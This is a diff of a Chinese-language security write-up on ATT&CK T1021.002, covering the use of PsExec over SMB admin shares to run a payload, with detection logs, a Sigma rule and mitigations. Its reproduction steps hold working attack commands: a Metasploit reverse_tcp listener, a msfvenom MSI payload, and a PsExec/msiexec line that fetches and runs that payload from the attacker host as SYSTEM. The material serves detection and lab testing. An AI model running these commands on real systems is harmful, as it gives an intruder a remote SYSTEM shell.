@@ -1,144 +1,150 @@
-# T1021-002-Win-基于白名单PsExec执行payload
+# T1021-002-Win-基于白名单PsExec执行Payload
 
-## 来自ATT&CK的描述
+## 描述
 
-攻击者可以使用服务器帐户阻止（SMB）使用有效帐户与远程网络共享进行交互。然后，攻击者可以以登录用户的身份执行操作。
-
-SMB是同一网络或域上Windows计算机的文件，打印机和串行端口共享协议。攻击者可以使用SMB与文件共享进行交互，从而允许他们在整个网络中横向移动。SMB的Linux和macOS实现通常使用Samba。
-
-Windows系统具有隐藏的网络共享，只有管理员才能访问它们，并提供了远程文件复制和其他管理功能。例如网络共享包括C$，ADMIN$，和IPC$。攻击者可以将此技术与管理员级别的有效帐户结合使用，以通过SMB远程访问网络系统；使用远程过程调用（RPC）与系统进行交互；传输文件；以及通过远程执行来运行传输的二进制文件。依赖于SMB/RPC上经过身份验证的会话的示例执行技术为计划任务/作业，服务执行和Windows管理规范。攻击者还可以使用NTLM哈希访问具有散列，特定配置和补丁程序级别的系统上的管理员共享。
+攻击者可能利用有效帐户通过服务器消息块（SMB）协议访问远程网络共享（如`C$`、`ADMIN$`、`IPC$`），以登录用户身份执行操作。SMB是Windows系统中用于文件、打印机和串行端口共享的协议，Linux和macOS通过Samba实现类似功能。Windows的隐藏管理员共享仅限管理员访问，支持远程文件复制和管理功能。攻击者结合管理员级凭据，通过SMB实现横向移动、文件传输或远程执行。PsExec是Sysinternals Suite的轻量级工具，允许在远程系统上执行进程，常被攻击者用于通过`IPC$`共享部署和执行恶意Payload（如Meterpreter），实现反弹Shell或其他恶意操作。
 
 ## 测试案例
 
-微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。
+### 用例
+- **横向移动**：使用PsExec通过`IPC$`共享在远程系统上执行命令或Payload。
+- **Payload部署**：通过`ADMIN$`共享上传恶意文件，随后使用PsExec执行。
+- **反弹Shell**：利用PsExec运行Meterpreter Payload，建立与攻击者C2服务器的连接。
+- **持久化**：通过PsExec创建计划任务或服务，确保恶意代码持续运行。
 
-微软官方文档：
+### 示例场景
+- 攻击者使用PsExec通过SMB在目标系统上运行`msiexec.exe`，安装从远程服务器下载的恶意MSI文件（`shellcode.msi`），建立Meterpreter反弹Shell。
+- 利用管理员凭据访问`IPC$`共享，执行远程命令。
 
-<https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec>
+### 路径
+- PsExec：通常由攻击者手动部署，路径如：
+  ```yml
+  - C:\Users\<username>\Desktop\PSTools\PsExec.exe
+  - C:\Temp\PsExec.exe
+  ```
+- PSEXESVC：PsExec在目标系统创建的服务，路径：
+  ```yml
+  - C:\Windows\PSEXESVC.exe
+  ```
 
-说明：PsExec.exe没有默认安装在windows系统。
+### 所需权限
+- 管理员权限（访问管理员共享、执行PsExec）。
+- 有效凭据或NTLM哈希（通过传递哈希攻击）。
 
-补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。
+### 操作系统
+- Windows 7、Windows 8、Windows 8.1、Windows 10、Windows 11、Windows Server 2008、2012、2016、2019、2022。
 
 ## 检测日志
 
-Windows 安全日志（需要自行配置）
+### Windows安全日志
+- **事件ID 4688**：记录`PsExec.exe`、`PSEXESVC.exe`或`msiexec.exe`进程创建及命令行参数（需启用命令行审核）。
+- **事件ID 5140**：记录网络共享访问（如`IPC$`）。
+- **事件ID 5145**：记录详细的共享访问（如`PSEXESVC`文件）。
+- **事件ID 4624**：记录网络登录事件（类型3，可能涉及SMB）。
+- **事件ID 4672**：记录分配给新登录的安全特权（如管理员登录）。
+
+### Sysmon日志
+- **事件ID 1**：捕获`PsExec.exe`、`PSEXESVC.exe`或`msiexec.exe`进程创建及命令行参数。
+- **事件ID 3**：记录SMB连接（TCP 445端口）的网络活动。
+- **事件ID 11**：记录共享中文件的创建或修改（如`PSEXESVC.exe`）。
+- **事件ID 7**：记录模块加载（如恶意MSI加载的DLL）。
+
+### Netflow日志
+- 捕获TCP 445端口的SMB流量及TCP 4444端口的反弹Shell流量。
 
 ## 测试复现
 
 ### 环境准备
+- **攻击机**：Kali Linux 2019（或其他支持Metasploit的系统）。
+- **靶机**：Windows 7/10/11或Windows Server 2012/2016（已启用SMB和管理员共享）。
+- **权限**：域管理员或本地管理员凭据。
+- **工具**：
+  - Metasploit Framework（生成Payload和监听反弹Shell）。
+  - PsExec（从https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec获取）。
+  - Sysmon（监控进程和网络活动）。
+  - Wireshark（捕获SMB和反弹Shell流量）。
+- **网络**：隔离网络环境，允许TCP 445和4444端口流量。
+- **日志**：启用Windows安全日志（配置审核进程创建）、Sysmon日志和Netflow日志。
+  - 启用命令行记录：
+    ```
+    本地计算机策略 > 计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在过程创建事件中加入命令行 > 启用
+    ```
 
-攻击机：Kali2019
-
-靶机：win7（sysmon日志）
-
-### 攻击分析
-
-#### 配置MSF
-
-```bash
-msf5 > use exploit/multi/handler
-msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-payload => windows/meterpreter/reverse_tcp
-msf5 exploit(multi/handler) > set lhost 192.168.126.146
-lhost => 192.168.126.146
-msf5 exploit(multi/handler) > set lport 4444
-lport => 4444
-msf5 exploit(multi/handler) > exploit
-```
-
-#### 生成payload
-
-```bash
-msfvenom -a  x86 --platform windows -p  windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f msi > shellcode.msi
-```
-
-#### 靶机执行
-
-注意：需要管理员权限
-
-```dos
-PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
-```
-
-#### 反弹shell
-
-```bash
-msf5 exploit(multi/handler) > exploit
-
-[*] Started reverse TCP handler on 192.168.126.146:4444
-[*] Sending stage (180291 bytes) to 192.168.126.149
-[*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49371) at 2020-04-18 23:09:44 +0800
-
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
-meterpreter > getpid
-Current pid: 2352
-```
+### 攻击步骤
+1. **配置Metasploit监听器（攻击机）**：
+   ```bash
+   msf5 > use exploit/multi/handler
+   msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+   msf5 exploit(multi/handler) > set lhost 192.168.126.146
+   msf5 exploit(multi/handler) > set lport 4444
+   msf5 exploit(multi/handler) > exploit
+   ```
+2. **生成恶意Payload（攻击机）**：
+   ```bash
+   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f msi > shellcode.msi
+   ```
+   - 托管`shellcode.msi`于攻击机的Web服务器：
+     ```bash
+     python3 -m http.server 80
+     ```
+3. **执行PsExec（靶机）**：
+   - 将`PsExec.exe`复制到靶机（如`C:\Users\12306Br0\Desktop\PSTools\PsExec.exe`）。
+   - 以管理员权限运行：
+     ```dos
+     PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
+     ```
+     - 参数说明：
+       - `-d`：非交互模式，后台运行。
+       - `-s`：以SYSTEM权限运行。
+       - `/q`：安静模式，无用户界面。
+       - `/i`：安装MSI文件。
+4. **获取反弹Shell（攻击机）**：
+   - Metasploit接收Meterpreter会话：
+     ```
+     [*] Started reverse TCP handler on 192.168.126.146:4444
+     [*] Sending stage (180291 bytes) to 192.168.126.149
+     [*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49371) at 2025-06-08 04:24:44 +0800
+     meterpreter > getuid
+     Server username: NT AUTHORITY\SYSTEM
+     ```
+5. **验证结果**：
+   - 检查靶机是否创建`C:\Windows\PSEXESVC.exe`。
+   - 使用Wireshark捕获TCP 445（SMB）和TCP 4444（反弹Shell）流量。
+   - 验证Sysmon日志是否记录`PsExec.exe`、`PSEXESVC.exe`和`msiexec.exe`的进程创建。
+6. **清理**：
+   - 靶机：
+     ```dos
+     del C:\Windows\PSEXESVC.exe
+     del C:\Users\12306Br0\Desktop\PSTools\PsExec.exe
+     ```
+   - 攻击机：
+     ```bash
+     rm shellcode.msi
+     ```
 
 ## 测试留痕
+以下为Windows安全日志示例（事件ID 4688，PsExec进程创建）：
+```yml
+EventID: 4688
+TimeCreated: 2025-06-08T04:24:29.237Z
+Channel: Security
+Hostname: WIN7-TARGET
+SubjectUserSid: S-1-5-21-1234567890-123456789-1234567890-1001
+SubjectUserName: 12306Br0
+SubjectDomainName: 12306Br0-PC
+SubjectLogonId: 0x6e1ea
+NewProcessId: 0xe84
+NewProcessName: C:\Users\12306Br0\Desktop\PSTools\PsExec.exe
+ProcessCommandLine: PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
+CreatorProcessId: 0xdac
+CreatorProcessName: C:\Windows\System32\cmd.exe
+TokenElevationType: %%1936
+```
 
-```log
-windows 安全日志
-EventID： 4688
-进程信息:
-新进程 ID: 0xe84
-新进程名: C:\Users\12306Br0\Desktop\PSTools\PsExec.exe
-
-EventID： 4688
-进程信息:
-新进程 ID: 0xfcc
-新进程名: C:\Windows\PSEXESVC.exe
-
-EVentID：5140
-网络信息:
-对象类型: File
-源地址: fe80::719e:d312:648f:4884
-源端口: 49369
-共享信息:
-共享名: \\*\IPC$
-
-EventID：5145
-网络信息:
-对象类型: File
-源地址: fe80::719e:d312:648f:4884
-源端口: 49369
-
-共享信息:
-共享名称: \\*\IPC$
-共享路径:
-相对目标名称: PSEXESVC
-
-SYSMON日志
-EventID：1
-Process Create:
-RuleName:
-UtcTime: 2020-04-18 15:09:29.237
-ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}
-ProcessId: 3716
-Image: C:\Users\12306Br0\Desktop\PSTools\PsExec.exe
-FileVersion: 2.2
-Description: Execute processes remotely
-Product: Sysinternals PsExec
-Company: Sysinternals - www.sysinternals.com
-OriginalFileName: psexec.c
-CommandLine: PsExec.exe  -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
-CurrentDirectory: C:\Users\12306Br0\Desktop\PSTools\
-User: 12306Br0-PC\12306Br0
-LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}
-LogonId: 0x6e1ea
-TerminalSessionId: 1
-IntegrityLevel: High
-Hashes: SHA1=E50D9E3BD91908E13A26B3E23EDEAF577FB3A095
-ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}
-ParentProcessId: 3492
-ParentImage: C:\Windows\System32\cmd.exe
-ParentCommandLine: "C:\Windows\System32\cmd.exe"
-
-EventID：1
-Process Create:
-RuleName:
-UtcTime: 2020-04-18 15:09:29.284
+以下为Sysmon日志示例（事件ID 1，PSEXESVC创建）：
+```yml
+EventID: 1
+UtcTime: 2025-06-08T04:24:29.284Z
 ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
 ProcessId: 4044
 Image: C:\Windows\PSEXESVC.exe
@@ -146,58 +152,101 @@ FileVersion: 2.2
 Description: PsExec Service
 Product: Sysinternals PsExec
 Company: Sysinternals
-OriginalFileName: psexesvc.exe
 CommandLine: C:\Windows\PSEXESVC.exe
 CurrentDirectory: C:\Windows\system32\
 User: NT AUTHORITY\SYSTEM
-LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
 LogonId: 0x3e7
-TerminalSessionId: 0
 IntegrityLevel: System
 Hashes: SHA1=A17C21B909C56D93D978014E63FB06926EAEA8E7
-ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}
 ParentProcessId: 496
 ParentImage: C:\Windows\System32\services.exe
-ParentCommandLine: C:\Windows\system32\services.exe
-
-EventID：1
-Process Create:
-RuleName:
-UtcTime: 2020-04-18 15:09:29.440
-ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}
-ProcessId: 1916
-Image: C:\Windows\System32\msiexec.exe
-FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
-Description: Windows® installer
-Product: Windows Installer - Unicode
-Company: Microsoft Corporation
-OriginalFileName: msiexec.exe
-CommandLine: "msiexec.exe" /q /i http://192.168.126.146/shellcode.msi
-CurrentDirectory: C:\Windows\system32\
-User: NT AUTHORITY\SYSTEM
-LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
-LogonId: 0x3e7
-TerminalSessionId: 0
-IntegrityLevel: System
-Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
-ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
-ParentProcessId: 4044
-ParentImage: C:\Windows\PSEXESVC.exe
-ParentCommandLine: C:\Windows\PSEXESVC.exe
 ```
 
-由于sysmon配置问题，只对进程创建行为进行监控
+以下为Windows安全日志示例（事件ID 5140，IPC$访问）：
+```yml
+EventID: 5140
+TimeCreated: 2025-06-08T04:24:29.456Z
+Channel: Security
+Hostname: WIN7-TARGET
+SubjectUserName: 12306Br0
+SubjectDomainName: 12306Br0-PC
+ShareName: \\*\IPC$
+SourceAddress: fe80::719e:d312:648f:4884
+SourcePort: 49369
+```
 
-## 检测规则/思路
+## 检测方法/思路
 
-无具体检测规则，可根据PsExec特征进行检测。
+### Sigma规则
+基于Sigma规则，检测PsExec执行Payload的行为：
+
+```yml
+title: Suspicious PsExec Execution via Admin Shares
+id: d9e8f7c6-6a5b-7c8d-9f0e-5b4c6d7e8f9b
+status: experimental
+description: Detects PsExec execution accessing admin shares to deploy payloads
+references:
+- https://attack.mitre.org/techniques/T1021/002
+- https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    EventID: 4688
+    Image|endswith:
+      - '\PsExec.exe'
+      - '\PSEXESVC.exe'
+  condition: selection
+falsepositives:
+- Legitimate administrative use of PsExec by IT staff
+- System maintenance tasks
+level: high
+```
+
+### 检测思路
+1. **进程监控**：
+   - 检测`PsExec.exe`和`PSEXESVC.exe`进程创建，尤其是命令行包含`msiexec.exe`或`.msi`。
+   - 监控异常父进程（如`cmd.exe`、`powershell.exe`）调用PsExec。
+2. **共享访问监控**：
+   - 检测`IPC$`、`C$`或`ADMIN$`共享的访问（事件ID 5140、5145）。
+   - 检查共享访问的相对目标名称（如`PSEXESVC`）。
+3. **网络监控**：
+   - 检测TCP 445端口的SMB流量，尤其是与`IPC$`共享的连接。
+   - 监控TCP 4444等非标准端口的反弹Shell流量。
+4. **文件监控**：
+   - 检测`C:\Windows\PSEXESVC.exe`的创建或异常MSI文件的下载。
+5. **行为基线**：
+   - 建立组织内PsExec和SMB共享的正常使用模式，识别异常行为（如夜间执行、非管理员用户）。
+
+### 检测建议
+- **Sysmon配置**：配置Sysmon监控进程创建（事件ID 1）、网络连接（事件ID 3）和文件操作（事件ID 11）。
+- **命令行记录**：启用Windows安全日志的命令行审核，捕获PsExec的详细参数。
+- **EDR监控**：使用EDR工具（如Microsoft Defender for Endpoint）检测PsExec执行和SMB共享访问。
+- **误报过滤**：排除IT管理员的合法PsExec使用，结合上下文（如用户身份、目标IP）降低误报率。
+
+## 缓解措施
+1. **共享访问控制**：
+   - 禁用不必要的管理员共享：
+     ```bash
+     reg add "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f
+     ```
+   - 限制对`C$`、`ADMIN$`和`IPC$`的访问，仅允许特定用户或IP。
+2. **凭据保护**：
+   - 启用多因素认证（MFA）保护管理员账户。
+   - 限制NTLM哈希传递攻击（如启用Kerberos或禁用NTLM）。
+3. **应用白名单**：
+   - 使用AppLocker或WDAC限制`PsExec.exe`和非系统工具的执行。
+4. **网络限制**：
+   - 配置防火墙阻止未经授权的TCP 445流量。
+   - 使用网络分段隔离敏感系统。
+5. **补丁管理**：
+   - 确保系统安装最新补丁，防止SMB协议漏洞（如EternalBlue）。
 
 ## 参考推荐
-
-MITRE-ATT&CK-T1021-002
-
-<https://attack.mitre.org/techniques/T1021/002/>
-
-基于白名单PsExec执行payload
-
-<https://blog.csdn.net/ws13129/article/details/89879771>
+- MITRE ATT&CK T1021.002  
+  https://attack.mitre.org/techniques/T1021/002  
+- PsExec官方文档  
+  https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec  
+- 基于白名单PsExec执行Payload  
+  https://blog.csdn.net/ws13129/article/details/89879771
